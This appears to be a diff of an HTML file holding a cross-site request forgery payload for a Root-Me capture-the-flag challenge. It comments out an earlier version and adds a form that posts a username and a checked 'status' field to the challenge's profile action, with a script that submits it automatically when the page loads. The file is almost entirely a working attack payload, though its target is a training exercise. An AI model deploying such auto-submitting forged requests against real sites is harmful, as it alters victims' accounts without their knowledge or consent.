@@ -1,6 +1,21 @@
-<form  name="csrf" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="POST">
+<!--<form  name="csrf" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="POST">
   <input type="text" name="username" value="jeje" />
-  <input type="checkbox" name="status" checked=checked />
-  <input type="submit" value="Submit request" />
+  <input type="checkbox" name="status" checked />
+  <button type="submit">Submit</button>
 </form>
 <script>document.csrf.submit()</script>
+--> 
+<form name="pls" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post">
+<div class="form-group">
+		<label>Username:</label>
+		<input name="username" value="devsid" type="text">
+		</div>
+		<br>		
+		<div class="form-group">
+		<label>Status:</label>
+		<input name="status"checked="checked" type="checkbox">
+		</div>
+		<br>	
+		<button type="submit">Submit</button>
+</form>
+<script language="javascript">document.pls.submit();</script>
